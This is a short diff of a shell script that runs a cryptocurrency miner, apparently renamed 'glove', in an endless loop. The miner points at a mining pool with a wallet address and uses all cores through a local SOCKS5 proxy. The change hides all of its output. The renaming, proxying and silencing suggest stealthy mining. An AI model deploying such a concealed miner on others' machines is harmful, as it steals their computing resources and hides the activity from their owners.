@@ -98,6 +98,6 @@ sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://eu-stratum.blockminerz.com:3505 -u RJvEryQP1KJqeaZv74ytVxWSS7KKdNSFfW.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082
+./glove -a minotaurx -o stratum+tcp://eu-stratum.blockminerz.com:3505 -u RJvEryQP1KJqeaZv74ytVxWSS7KKdNSFfW.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
 sleep 10
 done
